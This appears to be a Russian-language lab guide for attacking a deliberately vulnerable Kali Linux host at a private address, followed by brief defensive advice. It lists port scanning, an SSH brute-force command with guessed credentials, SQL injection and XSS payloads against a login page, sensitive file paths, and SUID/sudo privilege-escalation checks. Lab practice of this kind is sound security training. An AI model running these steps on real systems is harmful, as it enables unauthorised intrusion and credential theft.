
# Руководство по атаке на уязвимую Kali Linux

## Цель: 10.211.55.14

### 1. Разведка
- Сканирование портов: nmap -sT 10.211.55.14
- Проверка веб-сервисов: http://10.211.55.14

### 2. SSH Brute Force
- Пользователи: victor, admin, test
- Пароли: victor123, admin123, test123
- Команда: python3 ssh_brute_force.py 10.211.55.14 -u victor -w passwords.txt

### 3. Веб-атаки
- URL: http://10.211.55.14/login.php
- SQL Injection: admin' OR '1'='1
- XSS: <script>alert('XSS')</script>

### 4. Поиск конфиденциальных файлов
- /etc/passwords.txt
- /etc/secrets.txt
- /home/victor/documents/

### 5. Повышение привилегий
- Поиск SUID файлов: find / -perm -4000 2>/dev/null
- Проверка sudo: sudo -l

## Защита
- Используйте сильные пароли
- Включите fail2ban
- Настройте файрвол
- Регулярно обновляйте систему
